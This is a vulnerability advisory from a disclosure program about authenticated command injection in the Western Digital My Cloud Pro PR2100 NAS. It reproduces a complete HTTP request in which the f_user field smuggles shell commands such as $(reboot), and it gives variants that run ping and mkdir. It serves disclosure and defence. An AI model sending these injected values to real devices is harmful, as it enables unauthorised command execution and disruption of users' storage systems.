**Vulnerability Summary**<br>
A vulnerability in the Western Digital My Cloud Pro Series PR2100 allows authenticated users to execute commands arbitrary commands.

**Credit**<br>
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Vendor Response**<br>
The vendor was notified on the 28th of November 2017, and responded that they take security seriously and will be fixing this vulnerability promptly, repeated attempts to get a timeline or fix failed, the last update received from them was on the 31st of Jan 2018, no further emails sent to the vendor were responded. We are not aware of any fix or remediation for this vulnerability.

**Vulnerability Details**<br>
In detail, due to a logic flaw, with a forged HTTP request it is possible to bypass the authentication for HTTP basic and HTTP digest login types.
Log into the web application using a low privilege user, once the main page loads, find in burp proxy history for a request to `/cgi-bin/home_mgr.cgi`

```
POST /cgi-bin/home_mgr.cgi HTTP/1.1
Host: 10.10.10.193
Content-Length: 25
Accept: application/xml, text/xml, */*; q=0.01
Origin: http://10.10.10.193
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://10.10.10.193/
Accept-Language: ko,en-US;q=0.8,ko-KR;q=0.6,en;q=0.4
Cookie: PHPSESSID=650fda9b5fe3a35a5315d85bf929b247; fw_version=2.30.165; usern
ame=abcd; local_login=1; isAdmin=0
Connection: close
cmd=7&f_user=abcd$(reboot)
```

The last line can be replaced with:<br>
`cmd=7&f_user=abcd$(ping x.x.x.x)`

Or:<br>
`cmd=7&f_user=abcd$(mkdir /tmp/nshctest)`

This means you can run any Linux command and it would execute. But there will be no feedback in the response.
